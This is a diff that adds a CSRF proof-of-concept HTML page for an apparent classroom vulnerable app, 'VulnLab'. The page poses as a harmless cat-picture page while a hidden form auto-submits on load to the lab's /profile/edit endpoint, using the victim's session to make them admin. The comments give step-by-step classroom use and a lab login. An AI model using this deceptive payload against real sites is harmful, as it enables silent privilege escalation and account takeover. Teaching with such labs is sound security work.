@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<!--
+  VULN #10 - CSRF Proof of Concept (for VulnLab classroom demo)
+
+  HOW TO USE IN CLASS:
+  1. Open this file from a DIFFERENT origin than VulnLab — e.g. double-click
+     it so it opens as file:// in the browser, or host it on any other port.
+  2. In another tab, log in to VulnLab as a normal user (e.g. pawan/pawan123)
+     and keep that tab open (so the session cookie is active).
+  3. Open this csrf_poc.html page (or just load it) — the hidden form below
+     auto-submits to VulnLab's /profile/edit endpoint, using the VICTIM'S
+     own browser session cookie, and silently sets their role to "admin".
+  4. Go back to the VulnLab tab and refresh /admin — the victim is now an
+     admin, without ever clicking anything except opening this page.
+
+  WHY IT WORKS: /profile/edit has no CSRF token, and the session cookie has
+  no SameSite protection (see app.py SESSION_COOKIE_SAMESITE=None), so the
+  browser happily attaches the victim's VulnLab cookie to this cross-site
+  request.
+-->
+<html>
+<head><title>Totally Harmless Page</title></head>
+<body>
+  <h3>Loading cute cat pictures...</h3>
+  <form id="csrf-form" action="http://localhost:5000/profile/edit" method="POST" style="display:none;">
+    <input type="hidden" name="email" value="hacked@evil.example">
+    <input type="hidden" name="role" value="admin">
+  </form>
+  <script>
+    // Auto-submits the instant the victim's browser loads this page.
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
